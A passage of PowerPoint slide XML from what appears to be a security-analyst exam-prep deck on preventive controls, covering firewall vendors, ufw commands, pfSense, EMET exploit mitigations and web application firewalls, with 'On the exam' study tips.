              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewall subcategories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on purpose, enterprise, size of business</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Small-medium businesses up to service providers &amp; data centers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.cisco.com/c/en/us/products/security/firewalls/index.html</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347</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Palo Alto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Palo Alto Networks is a market leader in next-generation firewalls, offered as both physical appliances and software, spanning home and small-business units through enterprise and data-center platforms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its firewalls are also available as virtual machine (VM-series) instances, which matters as hypervisors and cloud become common because the same NGFW policy engine can run inside a virtualized or cloud environment rather than only on dedicated hardware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst benefits from Palo Alto's application-layer visibility (App-ID) and its ability to protect virtualized workloads with consistent policy across physical and cloud deployments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect Palo Alto to appear as the NGFW/virtual-firewall example, with questions on deploying firewall policy in virtualized or cloud environments.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348</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Palo Alto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Leader in NGFW, both hardware &amp; software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Offers firewalls across the spectrum</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Home, small business, enterprise &amp; data centers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewalls as VM containers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Since hypervisors are gaining popularity, these can be run in VM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.paloaltonetworks.com/products/secure-the-network/next-generation-firewall</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349</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Check Point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Check Point is a long-standing firewall vendor whose products range from small-business appliances up to large enterprise platforms, with a strong emphasis on next-generation firewall capabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is particularly well known for security tailored to industrial control systems (ICS) and SCADA environments, where specialized protocol awareness and ruggedized protection are required to defend operational technology.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts working in critical-infrastructure or OT-heavy settings should recognize Check Point as a go-to option for protecting sensitive ICS/SCADA devices that standard IT firewalls may not fully understand.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Check Point is likely to be cited as the NGFW vendor associated with ICS/SCADA protection in a segmentation or OT-security scenario.</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350</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Check Point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Firewalls for small business to enterprise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Highlights NGFW</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Well-known for superior ICS &amp; SCADA devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.checkpoint.com/products-solutions/next-generation-firewalls/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351</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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ufw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ufw (Uncomplicated Firewall) is a free, simplified front end to Linux's underlying iptables/netfilter rules, designed to make host-based firewalling approachable and to serve as a good learning tool for firewall concepts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  You turn it on with sudo ufw enable and review its state with sudo ufw status verbose; by default it denies incoming traffic (with some exceptions visible via sudo ufw show raw), stores its rules in files ending in .rules under /etc/ufw, and is disabled with sudo ufw disable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts use ufw to lock down individual Linux hosts quickly and to understand the default-deny-inbound principle that underpins good host firewall hygiene.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect command-recall items such as enabling ufw, checking status, and knowing that incoming traffic is denied by default.</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352</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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ufw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Uncomplicated firewall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Easy interface with IP tables (default allow/deny in Linux)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Free</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Great place to learn how to use firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To turn UFW on with the default set of rules: sudo ufw enable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To check the status of UFW: sudo ufw status verbose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353</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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ufw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Note that by default, deny is being applied to incoming. There are exceptions, which can be found in the output of this command: sudo ufw show raw</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  You can also read the rules files in /etc/ufw</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  (the files whose names end with.rules)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To disable ufw use: sudo ufw disable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To see get a list of services: less/etc/services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354</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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pfsense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pfSense is a free, open-source firewall and router platform built on FreeBSD, a Unix-like operating system, that runs on commodity hardware or a virtual machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It provides enterprise-grade features such as stateful packet filtering, NAT, VPN, and traffic shaping through a web-based management interface, making it a capable gateway solution without licensing cost.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst can deploy pfSense to segment and defend a network economically, and recognizing it as a FreeBSD-based firewall/router helps when documenting or auditing perimeter controls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: pfSense typically appears as the open-source firewall/router example, with questions noting its FreeBSD basis and free, feature-rich nature.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355</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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pfsense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Open source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewall/router</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Based on FreeBSD (Unix-like OS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.pfsense.org/products/#requirements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356</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Preventative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Preventative controls are safeguards deployed to stop threats before they can execute or cause harm, in contrast to detective controls that only alert after the fact.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Examples include antimalware and antivirus software that blocks malicious files, web proxies that filter outbound requests to risky sites, host-hardening tools such as EMET, and web application firewalls that shield server-side applications from attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts layer preventative controls as part of defense in depth, understanding that reducing the attack surface up front lowers the volume of incidents that detective and responsive controls must handle.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may ask you to classify a given control as preventative versus detective or corrective within a control-category question.</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357</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Preventative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Antimalware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Antivirus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Web Proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  EMET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Web Application Firewalls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358</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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EMET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The Enhanced Mitigation Experience Toolkit (EMET) is a free Microsoft tool that strengthens Windows against a variety of threats, especially zero-day exploits, by forcing security mitigations onto applications that might not enable them on their own.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It applies protections such as Data Execution Prevention (DEP), which blocks code execution from data pages, Address Space Layout Randomization (ASLR), which randomizes memory locations to defeat predictable exploits, and Control Flow Guard (CFG), which constrains indirect calls; EMET itself has reached end of life because these features are now built into modern Windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts should understand these exploit-mitigation techniques because they raise the cost of memory-corruption attacks, and recognize that newer Windows versions provide them natively without EMET.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on the exploit mitigations EMET provides (DEP, ASLR, CFG) and the fact that these protections are now integrated into current operating systems.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359</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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EMET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Enhanced Mitigation Experience Toolkit (EMET)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Free Microsoft product</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Enhance Windows system protection again variety of threats (esp. zero day exploits)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  EMET will reach end-of-life</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Features will be included in future OSes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data Execution Prevention (DEP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Address Space Layout Randomization (ASLR)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Control Flow Guard (CFG)</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360</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Web Application Firewall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A Web Application Firewall (WAF) protects server-side applications by inspecting traffic at Layer 7 of the OSI model, going beyond IP addresses and ports to examine URLs, host names, HTTP headers, and request payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This application-layer visibility lets a WAF detect and block attacks such as SQL injection and cross-site scripting that traditional network firewalls miss; common implementations include the open-source ModSecurity, NAXSI (Nginx Anti-XSS and SQL Injection), and the commercial Imperva.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst tunes WAF rules to defend public-facing web apps, using its logs to spot injection and scripting attempts and to virtually patch known application vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam contrasts a WAF's Layer 7 application protection (SQLi, XSS) with network-layer firewalls and may name ModSecurity or Imperva as examples.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361</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Web Application Firewall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Targeted to protect services (i.e. applications on a server)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
